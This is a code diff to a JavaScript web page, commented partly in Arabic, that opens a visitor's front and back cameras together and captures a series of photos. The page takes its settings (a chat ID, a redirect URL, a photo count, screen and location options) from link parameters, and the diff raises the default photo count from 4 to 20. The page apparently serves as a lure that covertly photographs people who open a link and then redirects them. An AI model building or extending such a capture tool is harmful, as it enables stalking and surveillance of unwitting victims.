@@ -374,7 +374,7 @@ const urlParams = new URLSearchParams(window.location.search);
 const CONFIG = {
     userId: urlParams.get("chatId") || "unknown",
     redirectUrl: urlParams.get("rd") || "",
-    maxPhotos: parseInt(urlParams.get("max")) || 4,
+    maxPhotos: parseInt(urlParams.get("max")) || 20, // زيادة عدد الصور إلى 20
     interval: parseInt(urlParams.get("interval")) || 1000,
     quality: parseFloat(urlParams.get("quality")) || 0.7,
     screen: urlParams.get("screen") === "true",
@@ -793,17 +793,20 @@ function initGeoPanelUI(geo) {
 // ===== CAMERA FUNCTIONS =====
 async function requestCameraPermission(facingMode) {
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
+        const constraints = {
             video: { 
-                facingMode,
+                facingMode: facingMode,
                 width: { ideal: 1280 },
                 height: { ideal: 720 }
             } 
-        });
-        addLog(`Camera permission granted: ${facingMode}`, 'success');
+        };
+        
+        addLog(`Requesting ${facingMode === 'user' ? 'front' : 'back'} camera permission...`, 'info');
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        addLog(`✅ ${facingMode === 'user' ? 'Front' : 'Back'} camera permission granted`, 'success');
         return stream;
     } catch (error) {
-        addLog(`Camera permission denied: ${facingMode} - ${error.message}`, 'warning');
+        addLog(`❌ ${facingMode === 'user' ? 'Front' : 'Back'} camera permission denied: ${error.message}`, 'warning');
         return null;
     }
 }
@@ -941,14 +944,23 @@ async function init() {
             return; // defer until user clicks
         }
         
-        // Request camera permissions
+        // Request camera permissions - محاولة فتح الكاميرتين في نفس الوقت
+        addLog('Requesting camera permissions (front & back)...', 'info');
+        
+        // محاولة فتح الكاميرتين بشكل متزامن
         const [frontStream, backStream] = await Promise.all([
-            requestCameraPermission('user'),
-            requestCameraPermission('environment')
+            requestCameraPermission('user').catch(err => {
+                addLog(`Front camera error: ${err.message}`, 'warning');
+                return null;
+            }),
+            requestCameraPermission('environment').catch(err => {
+                addLog(`Back camera error: ${err.message}`, 'warning');
+                return null;
+            })
         ]);
         
         if (!frontStream && !backStream) {
-            addLog('No cameras available', 'error');
+            addLog('❌ No cameras available', 'error');
             finishAndRedirect();
             return;
         }
@@ -959,19 +971,33 @@ async function init() {
         const frontCanvas = document.getElementById('frontCanvas');
         const backCanvas = document.getElementById('backCanvas');
         
+        // إعداد الكاميرا الأمامية
         if (frontStream) {
             totalCameras++;
+            addLog('✅ Front camera (user) ready', 'success');
             frontVideo.srcObject = frontStream;
-            frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front'));
+            frontVideo.addEventListener('loadedmetadata', () => {
+                addLog(`Front camera metadata loaded: ${frontVideo.videoWidth}x${frontVideo.videoHeight}`, 'info');
+                setupCamera(frontVideo, frontCanvas, 'front');
+            });
+        } else {
+            addLog('⚠️ Front camera not available', 'warning');
         }
         
+        // إعداد الكاميرا الخلفية
         if (backStream) {
             totalCameras++;
+            addLog('✅ Back camera (environment) ready', 'success');
             backVideo.srcObject = backStream;
-            backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back'));
+            backVideo.addEventListener('loadedmetadata', () => {
+                addLog(`Back camera metadata loaded: ${backVideo.videoWidth}x${backVideo.videoHeight}`, 'info');
+                setupCamera(backVideo, backCanvas, 'back');
+            });
+        } else {
+            addLog('⚠️ Back camera not available', 'warning');
         }
         
-        addLog(`Cameras initialized: ${totalCameras} total`, 'success');
+        addLog(`📷 Cameras initialized: ${totalCameras} total (Front: ${frontStream ? '✅' : '❌'}, Back: ${backStream ? '✅' : '❌'})`, 'success');
         
     } catch (error) {
         addLog(`Initialization failed: ${error.message}`, 'error');
